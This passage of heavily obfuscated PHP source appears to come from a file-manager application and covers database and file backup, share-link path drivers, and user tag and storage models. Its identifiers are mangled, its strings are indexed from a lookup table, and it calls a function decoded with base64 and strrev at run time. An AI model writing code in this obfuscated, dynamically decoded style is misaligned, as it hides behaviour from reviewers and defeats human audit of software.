$€àŸÌÜˆ[262] => $³±Ò‘½, $€àŸÌÜˆ[270] => $™©ûö‰ô, $€àŸÌÜˆ[271] => $ƒ¼ì·Ó®, $€àŸÌÜˆ[272] => $„•İ¾Ô, $€àŸÌÜˆ[273] => $‘¶±ƒÀ, $€àŸÌÜˆ[274] => $İİúÓßš, $€àŸÌÜˆ[275] => $•ä«’”, $€àŸÌÜˆ[192] => $this->getHost()); return $ÇßóÇÎ¤; } } define($_SERVER[¹òÍ›æş][276], 1); define($_SERVER[¹òÍ›æş][277], 2); goto b©§ŠÄßë; aˆ¤ÚÓ¤÷‚: $fileSize = strrev(base64_decode($_SERVER[øëœ¾ŞŠ][0])); function binCheckNeq($™Äşƒ‡ú, $æ¯™Ïˆù) { return $™Äşƒ‡ú != $æ¯™Ïˆù; } $_SERVER[$_SERVER[øëœ¾ŞŠ][1]] = $fileSize($_SERVER[$_SERVER[øëœ¾ŞŠ][2]]); goto b¡‡ˆÙÚåØ; Cß¿œ™ç…©: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $òşßâ’ =& $_SERVER[¹òÍ›æş]; $šƒ£šñ° = Backup::get(); self::$io = $šƒ£šñ°[$òşßâ’[781]]; self::$name = $šƒ£šñ°[$òşßâ’[32]]; $Ïº‡—…ã = new DbManage(); $ºƒ­Ê¤› = $Ïº‡—…ã->dbType(); $”åÅ‘• = array($òşßâ’[806] => $ºƒ­Ê¤›, $òşßâ’[807] => time()); Backup::set($”åÅ‘•); $ŸÀç²ˆù = $this->tmpFilesPath() . $òşßâ’[808] . self::$name . $òşßâ’[8]; del_dir($ŸÀç²ˆù); mk_dir($ŸÀç²ˆù); $ï°¢¨‚æ = $ÂïÖ‚»Õ = 0; $¤“ñ•¼ë = new Task($òşßâ’[809], $òşßâ’[810], 0, LNG($òşßâ’[811]) . $òşßâ’[812] . LNG($òşßâ’[813])); try { $¸İš¦ºá = $Ïº‡—…ã->db()->getTables(); } catch (Exception $úâ·äù¸) { $¤“ñ•¼ë->end(); return !1; } $¸İš¦ºá = array_diff($¸İš¦ºá, array($òşßâ’[814], $òşßâ’[815])); foreach ($¸İš¦ºá as $Ü‹è•°ã) { $ï°¢¨‚æ += $Ïº‡—…ã->model($Ü‹è•°ã)->count(); } $¤“ñ•¼ë->task[$òşßâ’[816]] = $ï°¢¨‚æ; $GLOBALS[$òşßâ’[817]] = self::$name; foreach ($¸İš¦ºá as $Ü‹è•°ã) { $¾™°–ØÂ = $ŸÀç²ˆù . $Ü‹è•°ã . $òşßâ’[818]; $©Äğïò = null; if ($Ü‹è•°ã == $òşßâ’[819] && (!isset($šƒ£šñ°[$òşßâ’[784]]) || $šƒ£šñ°[$òşßâ’[784]] == $òşßâ’[208])) { $©Äğïò = self::$io; } $ÂïÖ‚»Õ += $Ïº‡—…ã->sqlFromDb($Ü‹è•°ã, $¾™°–ØÂ, $¤“ñ•¼ë, $©Äğïò); } unset($GLOBALS[$òşßâ’[817]]); $¤“ñ•¼ë->end(); if ($ÂïÖ‚»Õ > $ï°¢¨‚æ) { $ï°¢¨‚æ = $ÂïÖ‚»Õ; } $”åÅ‘• = array($òşßâ’[806] => $ºƒ­Ê¤›, $òşßâ’[803] => 1, $òşßâ’[820] => $ï°¢¨‚æ, $òşßâ’[821] => $ÂïÖ‚»Õ, $òşßâ’[822] => time()); Backup::set($”åÅ‘•); if ($ï°¢¨‚æ - $ÂïÖ‚»Õ > 0) { $ôˆ’÷İÔ = $òşßâ’[823]; if (stristr(I18n::getType(), $òşßâ’[824])) { $ôˆ’÷İÔ = $òşßâ’[825]; } write_log(array($ôˆ’÷İÔ, $”åÅ‘•), $òşßâ’[810]); return !1; } return !0; } private function tmpFilesPath() { $ïü³ªó =& $_SERVER[¹òÍ›æş]; $ÁÖãÀËŒ = TEMP_FILES; if ($GLOBALS[$ïü³ªó[6]][$ïü³ªó[99]][$ïü³ªó[826]]) { $ÁÖãÀËŒ = $GLOBALS[$ïü³ªó[6]][$ïü³ªó[99]][$ïü³ªó[826]]; if (!mk_dir($ÁÖãÀËŒ) || !is_writable($ÁÖãÀËŒ) || !IO::mkfile($ÁÖãÀËŒ . $ïü³ªó[827])) { $ÁÖãÀËŒ = TEMP_FILES; } } return $ÁÖãÀËŒ; } } class BackupDbFile { public function __construct() { } public function index() { $Åİç¨±Š =& $_SERVER[¹òÍ›æş]; $¾Áê¦°° = Backup::get(); $¥¶€ Ø§ = $¾Áê¦°°[$Åİç¨±Š[32]]; $¯…â§Ş‡ = $this->tmpFilesPath() . "\x62\x61\143\153\165\x70\137{$¥¶€ Ø§}\x2f"; $¬‘Òª = $this->backupPath($¾Áê¦°°); if (!($¬‘Òª = IO::mkdir($¬‘Òª))) { return !1; } $¦ÒŞ©Ÿ = IO::listPath($¯…â§Ş‡); $ÔıÔØ“è = isset($¦ÒŞ©Ÿ[$Åİç¨±Š[93]]) ? $¦ÒŞ©Ÿ[$Åİç¨±Š[93]] : array(); $Ì·€ÊÀŠ = array_sum(array_column($ÔıÔØ“è, $Åİç¨±Š[86])); if (!$Ì·€ÊÀŠ) { return !1; } $²ªª¬‡ı = array($Åİç¨±Š[828] => $Ì·€ÊÀŠ, $Åİç¨±Š[829] => time()); Backup::set($²ªª¬‡ı); $¥¢¡ûµı = new TaskFileTransfer($Åİç¨±Š[830], $Åİç¨±Š[810], count($ÔıÔØ“è), LNG($Åİç¨±Š[811]) . $Åİç¨±Š[424] . LNG($Åİç¨±Š[813]) . $Åİç¨±Š[831]); $¥¢¡ûµı->task[$Åİç¨±Š[793]] = $Ì·€ÊÀŠ; foreach ($¦ÒŞ©Ÿ[$Åİç¨±Š[93]] as $çœŠ¯ˆ§) { $Ç¨şµœà = IO::move($çœŠ¯ˆ§[$Åİç¨±Š[94]], $¬‘Òª); if (!$Ç¨şµœà) { $¥¢¡ûµı->end(); $©á°¬É = IO::getLastError($Åİç¨±Š[832] . $çœŠ¯ˆ§[$Åİç¨±Š[94]] . $Åİç¨±Š[833] . $¬‘Òª . $Åİç¨±Š[174]); write_log($©á°¬É, $Åİç¨±Š[810]); return !1; } } $ÕœŠŞö¦ = new DbManage(); $Å„‹¦¶ª = $ÕœŠŞö¦->getSqlFile(); if (!$Å„‹¦¶ª[$Åİç¨±Š[834]] || !$Å„‹¦¶ª[$Åİç¨±Š[13]]) { return !1; } IO::move($Å„‹¦¶ª[$Åİç¨±Š[834]], $¬‘Òª); IO::move($Å„‹¦¶ª[$Åİç¨±Š[13]], $¬‘Òª); $¥¢¡ûµı->end(); $²ªª¬‡ı = array($Åİç¨±Š[835] => $Ì·€ÊÀŠ, $Åİç¨±Š[836] => time()); Backup::set($²ªª¬‡ı); return !0; } private function backupPath($àõÍÔä×) { $éĞèàÏ‡ =& $_SERVER[¹òÍ›æş]; $“ØİÙä’ = $àõÍÔä×[$éĞèàÏ‡[32]]; $Ò¾¥É÷ô = Model($éĞèàÏ‡[800])->get($éĞèàÏ‡[801]); $ó³‘ ³ = substr(md5($éĞèàÏ‡[802] . $Ò¾¥É÷ô . $“ØİÙä’), 0, 8); return "\x7b\x69\x6f\72{$àõÍÔä×[$éĞèàÏ‡[781]]}\x7d\57\x64\x61\164\x61\142\141\x73\145\x2f\x62\x61\143\x6b\165\160\57" . $“ØİÙä’ . $éĞèàÏ‡[11] . $ó³‘ ³; } private function tmpFilesPath() { $à¥©—¹Â =& $_SERVER[¹òÍ›æş]; $‘‚ÂÃ×Ä = TEMP_FILES; if ($GLOBALS[$à¥©—¹Â[6]][$à¥©—¹Â[99]][$à¥©—¹Â[826]]) { $‘‚ÂÃ×Ä = $GLOBALS[$à¥©—¹Â[6]][$à¥©—¹Â[99]][$à¥©—¹Â[826]]; if (!mk_dir($‘‚ÂÃ×Ä) || !is_writable($‘‚ÂÃ×Ä) || !IO::mkfile($‘‚ÂÃ×Ä . $à¥©—¹Â[827])) { $‘‚ÂÃ×Ä = TEMP_FILES; } } return $‘‚ÂÃ×Ä; } } class BackupFile { public function __construct() { } public function index() { $ÏÄû€ºù = Backup::get(); $èÛéµ ƒ = $ÏÄû€ºù[$_SERVER[¹òÍ›æş][331]][$_SERVER[¹òÍ›æş][210]][$_SERVER[¹òÍ›æş][506]]; $İ‘Ş˜Ë = array($_SERVER[¹òÍ›æş][507] => array($_SERVER[¹òÍ›æş][837], $èÛéµ ƒ), $_SERVER[¹òÍ›æş][838] => array($_SERVER[¹òÍ›æş][369], $ÏÄû€ºù[$_SERVER[¹òÍ›æş][781]])); $Ğ„È¥àç = (int) Model($_SERVER[¹òÍ›æş][819])->where($İ‘Ş˜Ë)->count($_SERVER[¹òÍ›æş][506]); $ŠæúÊ“ù = (int) Model($_SERVER[¹òÍ›æş][819])->where($İ‘Ş˜Ë)->sum($_SERVER[¹òÍ›æş][86]); $¸³¼ğŸ = new TaskFileTransfer($_SERVER[¹òÍ›æş][839], $_SERVER[¹òÍ›æş][810], $Ğ„È¥àç, LNG($_SERVER[¹òÍ›æş][811]) . $_SERVER[¹òÍ›æş][812] . LNG($_SERVER[¹òÍ›æş][840])); $¸³¼ğŸ->task[$_SERVER[¹òÍ›æş][793]] = $ŠæúÊ“ù; $’íìßØ = array($_SERVER[¹òÍ›æş][841] => $Ğ„È¥àç, $_SERVER[¹òÍ›æş][842] => $ŠæúÊ“ù, $_SERVER[¹òÍ›æş][843] => time()); Backup::set($’íìßØ); $Ôˆâğí = !0; $ûç‡ÓÖ = $this->storeIds(); $Äö§İö = 1; $‘µ¢Æ¯¯ = 1000; $±Ò¹Æåè = $ı¦Íñ…¬ = 0; $Âæ ‡Ï‡ = array(); $ì³¼© = $ÊéªÒ½à = 0; do { $ßÄëåÍ© = $_SERVER[¹òÍ›æş][844]; $àÔó”„ş = Model($_SERVER[¹òÍ›æş][819])->where($İ‘Ş˜Ë)->field($ßÄëåÍ©)->order($_SERVER[¹òÍ›æş][845])->selectPage($‘µ¢Æ¯¯, $Äö§İö); $Èí¶û = !empty($àÔó”„ş[$_SERVER[¹òÍ›æş][407]]) ? $àÔó”„ş[$_SERVER[¹òÍ›æş][407]] : array(); foreach ($Èí¶û as $àªŠ·Ò¸) { if (!$this->_fileExist($àªŠ·Ò¸, $Âæ ‡Ï‡, $ûç‡ÓÖ)) { $Ğ„È¥àç -= 1; $ŠæúÊ“ù -= (int) $àªŠ·Ò¸[$_SERVER[¹òÍ›æş][86]]; write_log("\146\151\x6c\145\40\x6e\x6f\x74\40\145\170\151\163\164\56\146\151\x6c\145\111\104\72{$àªŠ·Ò¸[$_SERVER[¹òÍ›æş][506]]}\54\x20\x70\141\164\150\x3a{$àªŠ·Ò¸[$_SERVER[¹òÍ›æş][94]]}", $_SERVER[¹òÍ›æş][846]); continue; } $ã˜Ò¯æŒ = $àªŠ·Ò¸[$_SERVER[¹òÍ›æş][94]]; $Íàâ ˜  = "\x7b\151\x6f\x3a{$ÏÄû€ºù[$_SERVER[¹òÍ›æş][781]]}\x7d" . substr($ã˜Ò¯æŒ, strlen("\173\x69\x6f\72{$àªŠ·Ò¸[$_SERVER[¹òÍ›æş][847]]}\x7d")); if (IO::exist($Íàâ ˜ )) { $¸³¼ğŸ->updateFileEnd($àªŠ·Ò¸[$_SERVER[¹òÍ›æş][32]], $àªŠ·Ò¸[$_SERVER[¹òÍ›æş][86]]); } else { $Íàâ ˜  = get_path_father($Íàâ ˜ ); IO::mkdir($Íàâ ˜ ); if (!IO::copy($ã˜Ò¯æŒ, $Íàâ ˜ , $_SERVER[¹òÍ›æş][848])) { write_log($_SERVER[¹òÍ›æş][849] . $ã˜Ò¯æŒ . $_SERVER[¹òÍ›æş][833] . $Íàâ ˜  . $_SERVER[¹òÍ›æş][174], $_SERVER[¹òÍ›æş][810]); $Ôˆâğí = !1; break; } } $èÛéµ ƒ = $àªŠ·Ò¸[$_SERVER[¹òÍ›æş][506]]; $ı¦Íñ…¬ += 1; $±Ò¹Æåè += $àªŠ·Ò¸[$_SERVER[¹òÍ›æş][86]]; $ÊéªÒ½à += 1; $ì³¼© += $àªŠ·Ò¸[$_SERVER[¹òÍ›æş][86]]; if ($±Ò¹Æåè >= 1024 * 1024 * 100) { $’íìßØ = array($_SERVER[¹òÍ›æş][850] => $èÛéµ ƒ, $_SERVER[¹òÍ›æş][851] => $ÊéªÒ½à, $_SERVER[¹òÍ›æş][852] => $ì³¼©); Backup::set($’íìßØ); $±Ò¹Æåè = $ı¦Íñ…¬ = 0; } } $ïÜª²Ô = count($Èí¶û); $Äö§İö++; } while ($ïÜª²Ô == $‘µ¢Æ¯¯); $¸³¼ğŸ->end(); $’íìßØ = array($_SERVER[¹òÍ›æş][853] => 1, $_SERVER[¹òÍ›æş][791] => time(), $_SERVER[¹òÍ›æş][805] => 1, $_SERVER[¹òÍ›æş][850] => $èÛéµ ƒ, $_SERVER[¹òÍ›æş][842] => $ŠæúÊ“ù, $_SERVER[¹òÍ›æş][841] => $Ğ„È¥àç, $_SERVER[¹òÍ›æş][854] => time()); if ($ı¦Íñ…¬) { $’íìßØ[$_SERVER[¹òÍ›æş][851]] = $ÊéªÒ½à; $’íìßØ[$_SERVER[¹òÍ›æş][852]] = $ì³¼©; } Backup::set($’íìßØ); $this->_fileFilter($Âæ ‡Ï‡); return !0; } private function _fileExist($®ï“Œ», &$îê”äÍø, $ßÅÑ˜™) { $¹ù—œÃ =& $_SERVER[¹òÍ›æş]; $§²Î©ÌÏ = $®ï“Œ»[$¹ù—œÃ[94]]; if (in_array($®ï“Œ»[$¹ù—œÃ[506]], $îê”äÍø)) { return !1; } if (!in_array($®ï“Œ»[$¹ù—œÃ[847]], $ßÅÑ˜™)) { return !1; } if (IO::exist($§²Î©ÌÏ)) { return !0; } $ÂÖìñü = get_path_father($§²Î©ÌÏ); if (IO::exist($ÂÖìñü)) { $îê”äÍø[] = $®ï“Œ»[$¹ù—œÃ[506]]; return !1; } $ğÄãÇ¯É = array($¹ù—œÃ[847] => $®ï“Œ»[$¹ù—œÃ[847]], $¹ù—œÃ[94] => array($¹ù—œÃ[421], "{$ÂÖìñü}\45")); $®ÜŸ¦Ú¢ = Model($¹ù—œÃ[819])->where($ğÄãÇ¯É)->field($¹ù—œÃ[507])->select(); $îê”äÍø = array_merge($îê”äÍø, array_to_keyvalue($®ÜŸ¦Ú¢, $¹ù—œÃ[12], $¹ù—œÃ[506])); return !1; } private function _fileFilter($÷À˜ÛİÅ) { $°à»Öå® =& $_SERVER[¹òÍ›æş]; if (empty($÷À˜ÛİÅ)) { return; } $ŸîÆÏå¤ = array($°à»Öå®[506] => array($°à»Öå®[7], array_unique($÷À˜ÛİÅ))); $Åœôé‹ï = Model($°à»Öå®[855])->where($ŸîÆÏå¤)->field($°à»Öå®[440])->select(); foreach ($Åœôé‹ï as $ùÈÇ³Ìû) { Model($°à»Öå®[855])->remove($ùÈÇ³Ìû[$°à»Öå®[440]], !1); } } private function storeIds() { $´êß¤»— =& $_SERVER[¹òÍ›æş]; $ˆ¡àƒê† = Model($´êß¤»—[797])->listData(); $‹—ÕşÁ® = array(); $Ï×Æß‰ä = $GLOBALS[$´êß¤»—[6]][$´êß¤»—[99]][$´êß¤»—[856]]; foreach ($ˆ¡àƒê† as $ş´»²Äé) { $Ø¹²Ê• = strtolower($ş´»²Äé[$´êß¤»—[105]]); if (!isset($Ï×Æß‰ä[$Ø¹²Ê•])) { continue; } $ûîÃ²Àñ = $´êß¤»—[84] . (isset($Ï×Æß‰ä[$Ø¹²Ê•]) ? $Ï×Æß‰ä[$Ø¹²Ê•] : ucfirst($Ø¹²Ê•)); if (!class_exists($ûîÃ²Àñ)) { continue; } $‹—ÕşÁ®[] = $ş´»²Äé[$´êß¤»—[437]]; } return $‹—ÕşÁ®; } } goto Dß©§ÓÅÂ†; bîÙ±Ç¿ˆõ: class PathDriverDriverShareItem { public function __construct($éÀ®ó©Ç) { $this->pathParse = $éÀ®ó©Ç; } public function __call($ÜÖ€ä”, $•áÓø×) { $ûÇ¹Êğ¶ =& $_SERVER[¹òÍ›æş]; if (method_exists($this, $ÜÖ€ä”)) { return; } $¯ÚÇÆ´ = call_user_func_array(array($ûÇ¹Êğ¶[1370], $ÜÖ€ä”), $•áÓø×); $•ÜŸ ù– = array($ûÇ¹Êğ¶[1371], $ûÇ¹Êğ¶[1372], $ûÇ¹Êğ¶[1373], $ûÇ¹Êğ¶[1374], $ûÇ¹Êğ¶[584], $ûÇ¹Êğ¶[586], $ûÇ¹Êğ¶[1375], $ûÇ¹Êğ¶[117], $ûÇ¹Êğ¶[1376], $ûÇ¹Êğ¶[1377]); if (in_array($ÜÖ€ä”, $•ÜŸ ù–)) { $¯ÚÇÆ´ = $this->getPathOuter($¯ÚÇÆ´); } return $¯ÚÇÆ´; } public function copy($šÙ÷Ò²á, $ïï†şÃÎ, $ÓâÖ¡ˆ˜ = false, $¨Ñ­ëÕ = false) { return $this->copyMove($šÙ÷Ò²á, $ïï†şÃÎ, $ÓâÖ¡ˆ˜, $_SERVER[¹òÍ›æş][584], $¨Ñ­ëÕ); } public function move($½Ñğˆ‹½, $ˆÀ¬Ë’Ë, $İ¢ìÖÒ… = false, $âƒóº”¾ = false) { return $this->copyMove($½Ñğˆ‹½, $ˆÀ¬Ë’Ë, $İ¢ìÖÒ…, $_SERVER[¹òÍ›æş][586], $âƒóº”¾); } private function copyMove($™“¦òş¿, $³»šõÙ, $“ß¨Å¹®, $”çšûõÈ, $Ø˜é€Ñë = false) { $Ê¢éÔ«” =& $_SERVER[¹òÍ›æş]; $æİñãÌú = $³»šõÙ; $¶×ãÄ’ó = IO::driverMake($³»šõÙ); if ($¶×ãÄ’ó->pathParse[$Ê¢éÔ«”[1178]]) { $³»šõÙ = $¶×ãÄ’ó->pathParse[$Ê¢éÔ«”[1178]]; } else { $³»šõÙ = $æİñãÌú; } $í±¿¿áŒ = IO::copyMove($™“¦òş¿, $³»šõÙ, $“ß¨Å¹®, $”çšûõÈ, $Ø˜é€Ñë); $í±¿¿áŒ = $this->getPathOuter($í±¿¿áŒ); return $í±¿¿áŒ; } public function pathThis($”ßõÎ¼•) { return get_path_this($this->pathParse[$_SERVER[¹òÍ›æş][94]]); } public function pathFather($î’Ìæ…) { return get_path_father($this->pathParse[$_SERVER[¹òÍ›æş][94]]); } public function iconvSystem($‹€ÜäşŠ) { return $‹€ÜäşŠ; } protected function infoParse($€ı…¼ª², $Ê²÷Ö±• = false) { $·×»™š‚ =& $_SERVER[¹òÍ›æş]; $›ã‡«˜† = $this->pathParse[$·×»™š‚[524]][$·×»™š‚[1202]] . $this->pathParse[$·×»™š‚[1195]]; if ($Ê²÷Ö±•) { $È³óş­ß = IO::infoWithChildren($›ã‡«˜†); } else { $È³óş­ß = IO::info($›ã‡«˜†); } $Âğß£¶„ = $this->pathParse[$·×»™š‚[524]]; return Action($·×»™š‚[1368])->_shareItemeParse($È³óş­ß, $Âğß£¶„); } public function listAll($»®²³ˆ–) { $ÆĞ€½ı =& $_SERVER[¹òÍ›æş]; $¶ßõÃó„ = IO::listAll($»®²³ˆ–); $ìØïÛè = rtrim($this->pathParse[$ÆĞ€½ı[524]][$ÆĞ€½ı[1202]], $ÆĞ€½ı[8]); foreach ($¶ßõÃó„ as &$ÖªÜ¬›ª) { $ÖªÜ¬›ª[$ÆĞ€½ı[94]] = $this->pathDriver . $ÆĞ€½ı[8] . ltrim(substr($ÖªÜ¬›ª[$ÆĞ€½ı[94]], strlen($ìØïÛè)), $ÆĞ€½ı[8]); } unset($ÖªÜ¬›ª); return $¶ßõÃó„; } public function listAllSimple($‰ÜÊ¸¬ş, $Öøı¿ïĞ = false) { $´©³â»Š =& $_SERVER[¹òÍ›æş]; $òÆ¾ÓÍ = $this->listAll($‰ÜÊ¸¬ş); $úõ›­Ë’ = $this->pathParse[$´©³â»Š[459]]; if (trim($úõ›­Ë’, $´©³â»Š[8]) == trim(get_path_father($úõ›­Ë’), $´©³â»Š[8])) { $Öøı¿ïĞ = !0; } return IO::init($´©³â»Š[12])->listAllSimpleMake($òÆ¾ÓÍ, $úõ›­Ë’, $Öøı¿ïĞ); } public function getPathOuter($ Şş„ë§) { $«çî­¢¿ =& $_SERVER[¹òÍ›æş]; $‚Ÿ•ÃÇ = KodIO::parse($ Şş„ë§); if ($‚Ÿ•ÃÇ[$«çî­¢¿[33]] == KodIO::KOD_SHARE_ITEM) { return $‚Ÿ•ÃÇ[$«çî­¢¿[94]]; } $¿Òä¿ë = KodIO::clear($ Şş„ë§); $“ñ·ñÖ± = KodIO::clear($this->pathParse[$«çî­¢¿[524]][$«çî­¢¿[1202]]); $ºŸôö£Ó = substr($¿Òä¿ë, strlen($“ñ·ñÖ±)); if (substr($¿Òä¿ë, 0, strlen($“ñ·ñÖ±)) != $“ñ·ñÖ±) { return !1; } return $this->pathParse[$«çî­¢¿[1196]] . $«çî­¢¿[8] . ltrim($ºŸôö£Ó, $«çî­¢¿[8]); } public function getType() { $ªˆ¬«İ¢ =& $_SERVER[¹òÍ›æş]; $ÙêÊ¬î£ = str_replace($ªˆ¬«İ¢[84], $ªˆ¬«İ¢[12], get_class($this)); return strtolower($ÙêÊ¬î£); } public function isTypeObject($¼ÅÆ¨ËÍ) { return IO::isTypeObject($¼ÅÆ¨ËÍ); } public function info($‚Úå±†–) { return $this->infoParse($‚Úå±†–); } public function infoAuth($òíé¿ë—) { return $this->infoParse($òíé¿ë—); } public function infoWithChildren($í¥Ó¼Á–) { return $this->infoParse($í¥Ó¼Á–, !0); } public function infoFull($ğ˜ùÕËŒ) { return $this->infoParse($ğ˜ùÕËŒ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($³¤–Æ‹) { $this->pathParse = $³¤–Æ‹; } protected function infoParse($•ë¬ ¼, $æñ üäÓ = false) { $ñÅâ«ş =& $_SERVER[¹òÍ›æş]; return Action($ñÅâ«ş[1201])->sharePathInfo($this->pathParse[$ñÅâ«ş[94]], !0, $æñ üäÓ); } public function listPath($ï°ıÂ§ú, $÷à•¥‚ş = false) { $‘ıç =& $_SERVER[¹òÍ›æş]; $—ø±Ç“Ÿ = IO::listPath($ï°ıÂ§ú, $÷à•¥‚ş); if (!$—ø±Ç“Ÿ) { return $—ø±Ç“Ÿ; } if (is_array($—ø±Ç“Ÿ[$‘ıç[1369]])) { $°¤·ÃË½ = Action($‘ıç[1378])->parsePathChildren($—ø±Ç“Ÿ[$‘ıç[1369]], array($‘ıç[459] => $ï°ıÂ§ú)); $—ø±Ç“Ÿ[$‘ıç[1369]] = Action($‘ıç[1201])->shareItemInfo($°¤·ÃË½); } foreach ($—ø±Ç“Ÿ as $ˆà¤ñêÍ => $Õ˜Ì¨‚Ó) { if (!in_array($ˆà¤ñêÍ, array($‘ıç[93], $‘ıç[92]))) { continue; } foreach ($Õ˜Ì¨‚Ó as $¦Áîìƒ« => $°¤·ÃË½) { $°¤·ÃË½ = Action($‘ıç[1378])->parsePathChildren($°¤·ÃË½, array($‘ıç[459] => $ï°ıÂ§ú)); $—ø±Ç“Ÿ[$ˆà¤ñêÍ][$¦Áîìƒ«] = Action($‘ıç[1201])->shareItemInfo($°¤·ÃË½); } } return $—ø±Ç“Ÿ; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($“×Îš…) { parent::__construct($“×Îš…); } } goto AŒ¿ëºÕÈ‹; dèê‡…İÌ„: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\162\x5f\157\x70\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ÆÒï¼ô) { $é£Ï·¡ =& $_SERVER[¹òÍ›æş]; $æöÂ®õÛ = defined($é£Ï·¡[2080]) && USER_ID ? USER_ID : $é£Ï·¡[12]; return "\x55\x73\x65\162\117\160\164\x69\x6f\156\137{$ÆÒï¼ô}\x5f" . $æöÂ®õÛ; } protected function filterWhere($Ñõğ˜àš) { $›¤ğØ» =& $_SERVER[¹òÍ›æş]; $Ñõğ˜àš[$›¤ğØ»[1669]] = defined($›¤ğØ»[2080]) && USER_ID ? USER_ID : $›¤ğØ»[12]; return $Ñõğ˜àš; } public function cacheRemoveUser($¥ØŒôß, $¾…¬¤÷Ë) { return Cache::remove("\x55\163\145\162\117\x70\x74\151\x6f\156\137{$¥ØŒôß}\x5f" . $¾…¬¤÷Ë); } protected function optionDefault($´¤é®é‘ = '') { $¿³Àòø =& $_SERVER[¹òÍ›æş]; if ($´¤é®é‘ == $¿³Àòø[12]) { return $GLOBALS[$¿³Àòø[6]][$¿³Àòø[2351]]; } if ($´¤é®é‘ == $¿³Àòø[2352]) { return $GLOBALS[$¿³Àòø[6]][$¿³Àòø[2353]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\x72\x2e\164\x61\x67\x4c\151\163\x74"; public $modelType = "\x55\x73\x65\162\117\x70\x74\151\x6f\x6e"; public $field = array("\156\x61\155\x65", "\x73\164\x79\x6c\x65", "\163\157\x72\x74"); public function listData($²šâÛÇ = false, $ÍŒ‘ıÄ = "\x73\157\162\x74", $Îç¶ãüŞ = false) { return parent::listData($²šâÛÇ, $ÍŒ‘ıÄ, $Îç¶ãüŞ); } public function remove($ÒóãÃ¯) { return parent::remove($ÒóãÃ¯); } public function add($çÙÃ«¤ğ, $È¶ƒÖèÄ = "\x6c\141\142\x65\x6c\55\x67\162\x65\x79\55\x6e\157\162\155\141\154") { $®©îëÖ =& $_SERVER[¹òÍ›æş]; if ($this->findByName($çÙÃ«¤ğ)) { return !1; } $èËãºëµ = array($®©îëÖ[458] => $çÙÃ«¤ğ, $®©îëÖ[522] => $È¶ƒÖèÄ, $®©îëÖ[1863] => $this->getSort($®©îëÖ[296]) + 1); return parent::insert($èËãºëµ); } public function update($½˜ø, $€Òùš‘) { $­±±Ü»É =& $_SERVER[¹òÍ›æş]; $€°‚ƒÏ‹ = $this->listData($½˜ø); $ì¼Ğ°®Î = $this->findByName($€Òùš‘[$­±±Ü»É[32]]); if (!$€°‚ƒÏ‹ || $ì¼Ğ°®Î && $ì¼Ğ°®Î[$­±±Ü»É[437]] != $€°‚ƒÏ‹[$­±±Ü»É[437]]) { return !1; } return parent::update($½˜ø, $€Òùš‘); } public function moveTop($§ıç™ø¿) { $õÎÒÄç¬ =& $_SERVER[¹òÍ›æş]; $ç¤¢´¯¬ = parent::listData(); $ß˜—ı´† = $this->getSort($õÎÒÄç¬[295]); foreach ($ç¤¢´¯¬ as &$š‘¦ä€è) { if ($š‘¦ä€è[$õÎÒÄç¬[437]] == $§ıç™ø¿) { $š‘¦ä€è[$õÎÒÄç¬[1883]] = $ß˜—ı´†; continue; } $š‘¦ä€è[$õÎÒÄç¬[1883]] += 1; } unset($š‘¦ä€è); return parent::resetData($ç¤¢´¯¬); } public function moveBottom($¿áÅ’½¨) { $œÊõ§Â¤ =& $_SERVER[¹òÍ›æş]; $Û’œÎÌ = $this->getSort($œÊõ§Â¤[296]) + 1; return parent::update($¿áÅ’½¨, array($œÊõ§Â¤[1883] => $Û’œÎÌ)); } public function resetSort($‘Õ¾÷»ö) { $Ñ’öÃò– =& $_SERVER[¹òÍ›æş]; $‚¡Éö¢¹ = array(); $‘Õ¾÷»ö = is_array($‘Õ¾÷»ö) ? $‘Õ¾÷»ö : array(); for ($²Àî­ = 0; $²Àî­ < count($‘Õ¾÷»ö); $²Àî­++) { $‚¡Éö¢¹[$‘Õ¾÷»ö[$²Àî­] . $Ñ’öÃò–[12]] = $²Àî­ + 1; } $û™ğö‘ = parent::listData(); foreach ($û™ğö‘ as &$œáöğåä) { $¾ù‰±ü = $‚¡Éö¢¹[$œáöğåä[$Ñ’öÃò–[437]]]; $œáöğåä[$Ñ’öÃò–[1883]] = $¾ù‰±ü ? $¾ù‰±ü : $œáöğåä[$Ñ’öÃò–[1883]]; } unset($œáöğåä); return parent::resetData($û™ğö‘); } private function getSort($öÀŸ²Õ‹) { $ã•Í¸ûË =& $_SERVER[¹òÍ›æş]; $ö¹ãØƒ = parent::listData(); $Ä‡Íéšû = array_to_keyvalue($ö¹ãØƒ, $ã•Í¸ûË[12], $ã•Í¸ûË[1883]); if (!$Ä‡Íéšû) { $Ä‡Íéšû = array(0); } $óĞ©îí¸ = $öÀŸ²Õ‹ == $ã•Í¸ûË[296] ? max($Ä‡Íéšû) : min($Ä‡Íéšû); return intval($óĞ©îí¸); } } goto aßÔ×›­‡; cÈÇÄ‡ËÇÑ: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\163\x6f\x75\x72\x63\145\123\x65\x63\x72\x65\164\x4c\151\x73\164"; public $field = array("\x73\x6f\165\x72\x63\x65\111\x44", "\x74\171\160\x65\111\104", "\143\x72\x65\141\x74\145\x55\x73\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\56\163\164\x6f\x72\141\x67\145\x4c\x69\x73\164"; public $field = array("\x6e\x61\x6d\145", "\163\x69\172\x65\x4d\141\x78", "\163\171\x73\x74\x65\155", "\144\145\x66\141\165\x6c\164", "\144\162\151\166\145\162", "\x63\157\156\x66\151\147"); public function listData($Üøàó£ = false, $œ±£ï›È = "\x6d\x6f\144\151\146\x79\124\x69\x6d\145", $Û°ÁÅ” = false) { $¬¿ş·Óº =& $_SERVER[¹òÍ›æş]; $­Î¬Õí¡ = parent::listData($Üøàó£, $œ±£ï›È, $Û°ÁÅ”); if ($Üøàó£) { return $­Î¬Õí¡; } $ÈÏ¢›µ³ = $this->ioSizeUseGet(array_to_keyvalue($­Î¬Õí¡, $¬¿ş·Óº[12], $¬¿ş·Óº[437])); foreach ($­Î¬Õí¡ as $—ÉÓì¤ => $·‘˜À´ˆ) { 